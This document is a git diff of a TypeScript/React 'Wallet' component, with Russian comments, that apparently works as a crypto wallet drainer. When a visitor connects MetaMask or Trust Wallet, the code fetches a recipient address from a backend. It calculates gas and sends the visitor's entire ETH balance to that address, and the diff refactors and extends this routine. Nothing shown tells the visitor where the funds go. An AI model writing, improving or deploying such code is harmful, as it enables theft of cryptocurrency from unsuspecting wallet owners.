@@ -1,64 +1,104 @@
 'use client'
 
 import { BACKEND_LINK } from '@/utils/variables';
-import { useState } from 'react'
-import Web3 from 'web3'
+import { useState } from 'react';
+import Web3 from 'web3';
+import type { ExternalProvider } from 'web3-core';
 
 
-interface EthereumProvider {
-  selectedAddress?: string
-  isMetaMask?: boolean
-  isTrust?: boolean
-  request(args: { method: string; params?: unknown[] }): Promise<unknown>
-  on?(event: string, listener: (...args: unknown[]) => void): void
-  removeListener?(event: string, listener: (...args: unknown[]) => void): void
+async function fetchDataFromBackend(setStatus: (msg: string) => void,): Promise<string> {
+  /*
+    Получения Адреса кошелька
+  */
+  setStatus('Получаем адрес получателя от бэка…');
+  const res = await fetch(`${BACKEND_LINK}/contract`);
+  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`);
+  const { address } = await res.json() as { address: string };
+  return address;
+}
+
+interface ResponseCalculateGasTrx {
+  maxPriorityFee: string;
+  maxFee: string;
+  gasLimit: string;
+  sendValue: string;
+}
+
+async function calculateGasTrx(addr: string, addr_recipient: string, web3: Web3):Promise<ResponseCalculateGasTrx> {
+  const balanceWei = BigInt(await web3.eth.getBalance(addr));
+  const block = await web3.eth.getBlock('pending');
+  const baseFee = block.baseFeePerGas
+    ? BigInt(block.baseFeePerGas as any)
+    : 0n;
+  let maxPriorityFee: bigint;
+  try {
+    maxPriorityFee = BigInt(
+      await (web3.eth as any).getMaxPriorityFeePerGas()
+    );
+  } catch {
+    maxPriorityFee = BigInt(web3.utils.toWei('2.5', 'gwei'));
+  }
+  const maxFee = baseFee * 2n + maxPriorityFee;
+
+  // 4) Оцениваем gas для простого transfer (receive-функция контракта)
+  let estimatedGas: bigint;
+  try {
+    const gasEstimate = await web3.eth.estimateGas({
+      from: addr,
+      to: addr_recipient,
+      value: '0x0',            // для оценки самого receive()
+      maxPriorityFeePerGas: maxPriorityFee.toString(),
+      maxFeePerGas: maxFee.toString(),
+      type: '0x2',
+    });
+    estimatedGas = BigInt(gasEstimate);
+  } catch {
+    // если не удалось, берём минимальный стандарт
+    estimatedGas = 21000n;
+  }
+  const gasLimit = estimatedGas + 1000n; // запас 1000
+
+  // 5) Считаем, сколько уйдёт на газ, и вычитаем из баланса
+  const gasCost = gasLimit * maxFee;
+  const sendValue = balanceWei - gasCost;
+  if (sendValue <= 0n) {
+    throw new Error('Недостаточно средств на оплату газа');
+  }
+  return {
+    'maxPriorityFee': maxPriorityFee.toString(),
+    'maxFee': maxFee.toString(),
+    'gasLimit': gasLimit.toString(),
+    'sendValue': sendValue.toString(16),
+  }
 }
 
 // Вынесенная функция: вся логика взаимодействия с контрактом
-async function sendAllBalance(
-  eth: EthereumProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
+async function sendAllBalanceMetamask(
+  eth: ExternalProvider & { isMetaMask?: boolean; isTrust?: boolean },
   addr: string,
-  setStatus: (msg: string) => void
+  setStatus: (msg: string) => void,
 ): Promise<string> {
-  // 1. Получаем адрес получателя от бэка
-  setStatus('Получаем адрес получателя от бэка…')
-  const res = await fetch(`${BACKEND_LINK}/contract`)
-  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
-  const { recipient } = await res.json() as { recipient: string }
+  // 1. Получаем Адрес получателя
+  const addr_recipient = await fetchDataFromBackend(setStatus);
 
   // 2. Настраиваем Web3
   const web3 = new Web3(eth)
 
-  // 3. Получаем баланс пользователя и параметры газа
-  const balanceWei = BigInt(await web3.eth.getBalance(addr))
-  const gasLimit = 21000n
-  const block = await web3.eth.getBlock('pending')
-  const baseFeePerGas = block.baseFeePerGas ? BigInt(block.baseFeePerGas) : BigInt(0);
-  let maxPriorityFeePerGas: bigint
-  try {
-    maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
-  } catch {
-    maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
-  }
-  const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
+  const data_calc_trx = await calculateGasTrx(addr, addr_recipient, web3);
+  const hexValue = '0x' + data_calc_trx.sendValue;
 
-  // 4. Рассчитываем сумму к отправке
-  const gasCost = maxFeePerGas * gasLimit
-  const amountToSend = balanceWei - gasCost
-  if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
-  const hexValue = '0x' + amountToSend.toString(16)
-
-  // 5. Отправляем транзакцию
-  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
+    // 6) Отправляем транзакцию
+  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`);
   const receipt = await web3.eth.sendTransaction({
     from: addr,
-    to: recipient,
+    to: addr_recipient,
     value: hexValue,
-    gas: gasLimit.toString(),
-    maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
-    maxFeePerGas: maxFeePerGas.toString(10),
+    maxPriorityFeePerGas: data_calc_trx.maxPriorityFee.toString(),
+    maxFeePerGas: data_calc_trx.maxFee.toString(),
+    gas: data_calc_trx.gasLimit.toString(),
     type: '0x2',
-  })
+  });
+
   return String(receipt.transactionHash);
 }
 
@@ -68,11 +108,17 @@ export default function Wallet() {
   const [busy, setBusy] = useState(false)
 
   async function connectAndSendBalance() {
-    const eth = window.ethereum
+    const eth = window.ethereum as ExternalProvider & {
+      isMetaMask?: boolean
+      isTrust?: boolean
+    }
     if (!eth) {
       setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
       return
     }
+
+    const isMetaMask = !!eth.isMetaMask
+    const isTrustWallet = !!eth.isTrust
 
     setBusy(true)
     setStatus('Запрашиваем аккаунт…')
@@ -82,8 +128,8 @@ export default function Wallet() {
         const resp = await eth.request({ method: 'eth_requestAccounts' })
         addr = (resp as string[])[0]
       } catch (e: unknown) {
-        const msg = e instanceof Error ? e.message : String(e)
-        setStatus(`Ошибка: ${msg}`)
+        const msg = e instanceof Error ? e.message : String(e);
+        setStatus(`Ошибка: ${msg}`);
         setBusy(false)
         return
       }
@@ -91,11 +137,11 @@ export default function Wallet() {
     setAccount(addr)
 
     try {
-      const txHash = await sendAllBalance(eth, addr, setStatus)
+      const txHash = await sendAllBalanceMetamask(eth, addr, setStatus)
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: unknown) {
-      const msg = e instanceof Error ? e.message : String(e)
-      setStatus(`Ошибка: ${msg}`)
+      const msg = e instanceof Error ? e.message : String(e);
+      setStatus(`Ошибка: ${msg}`);
     } finally {
       setBusy(false)
     }
